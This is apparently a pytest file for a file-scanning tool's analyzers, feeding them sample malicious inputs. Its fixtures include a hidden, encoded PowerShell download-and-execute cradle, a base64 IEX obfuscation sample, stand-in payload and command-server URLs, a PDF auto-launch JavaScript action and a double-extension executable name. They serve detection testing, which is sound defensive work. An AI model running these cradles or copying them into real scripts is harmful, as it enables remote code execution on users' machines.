"""Tests for individual analyzers (stdlib-only paths; optional libs skipped)."""

from __future__ import annotations

import pytest

from hawkscan.core import fileinfo
from hawkscan.analyzers.base import AnalysisContext
from hawkscan.analyzers.entropy import shannon_entropy, EntropyAnalyzer
from hawkscan.analyzers.strings_analyzer import StringsAnalyzer, extract_strings
from hawkscan.analyzers.script_analyzer import ScriptAnalyzer
from hawkscan.analyzers.pdf_analyzer import PDFAnalyzer
from hawkscan.analyzers.archive_analyzer import ArchiveAnalyzer
from hawkscan.core.findings import Severity


def _ctx(tmp_path, name: str, data: bytes) -> AnalysisContext:
    f = tmp_path / name
    f.write_bytes(data)
    return AnalysisContext(info=fileinfo.inspect(f), content=data)


def _titles(findings):
    return [f.title for f in findings]


# ---- entropy ------------------------------------------------------------

def test_entropy_bounds():
    assert shannon_entropy(b"") == 0.0
    assert shannon_entropy(b"\x00" * 1000) == 0.0          # zero randomness
    assert shannon_entropy(bytes(range(256)) * 8) > 7.9    # near-max randomness


def test_entropy_flags_high(tmp_path):
    data = bytes((i * 73 + 31) % 256 for i in range(4096))  # pseudo-random-ish
    ctx = _ctx(tmp_path, "blob.bin", data)
    findings = list(EntropyAnalyzer().analyze(ctx))
    assert findings  # always emits at least an info-level entropy reading


# ---- strings ------------------------------------------------------------

def test_strings_truncation_flag():
    data = b"AAAA\n" * 10
    out, truncated = extract_strings(data, limit=3)
    assert truncated is True
    assert len(out) == 3


def test_strings_detects_powershell_cradle(tmp_path):
    data = b"powershell -w hidden -enc aaa; IEX (New-Object Net.WebClient).DownloadString('http://x/y')"
    ctx = _ctx(tmp_path, "s.bin", data)
    titles = _titles(StringsAnalyzer().analyze(ctx))
    assert any("Encoded PowerShell" in t for t in titles)
    assert any("Dynamic code execution" in t for t in titles)


def test_strings_extracts_urls(tmp_path):
    data = b"connect to http://evil.example.com/payload and http://c2.example.net"
    ctx = _ctx(tmp_path, "s.bin", data)
    findings = list(StringsAnalyzer().analyze(ctx))
    assert any(f.category == "network" and "URL" in f.title for f in findings)


# ---- script -------------------------------------------------------------

def test_script_does_not_apply_to_plain_text(tmp_path):
    ctx = _ctx(tmp_path, "notes.txt", b"just some text " * 50)
    assert ScriptAnalyzer().applies(ctx) is False


def test_script_flags_obfuscation(tmp_path):
    blob = b"x" * 0  # build an obfuscated-looking ps1
    data = b"$a='" + b"QQ" * 300 + b"';IEX([Convert]::FromBase64String($a))"
    ctx = _ctx(tmp_path, "evil.ps1", data)
    findings = list(ScriptAnalyzer().analyze(ctx))
    cats = {f.category for f in findings}
    assert "execution" in cats or "obfuscation" in cats


# ---- pdf ----------------------------------------------------------------

def test_pdf_flags_javascript_and_openaction(tmp_path):
    data = b"%PDF-1.5\n/OpenAction << /JS (app.alert) /S /JavaScript >>\n/Launch"
    ctx = _ctx(tmp_path, "x.pdf", data)
    findings = list(PDFAnalyzer().analyze(ctx))
    cats = {f.category for f in findings}
    assert "execution" in cats
    assert any(f.severity >= Severity.HIGH for f in findings)


# ---- archive ------------------------------------------------------------

def test_archive_detects_double_extension(tmp_path):
    import io, zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("invoice.pdf.exe", b"MZ\x90\x00 fake")
    ctx = _ctx(tmp_path, "a.zip", buf.getvalue())
    findings = list(ArchiveAnalyzer().analyze(ctx))
    assert any("Double-extension" in f.title for f in findings)
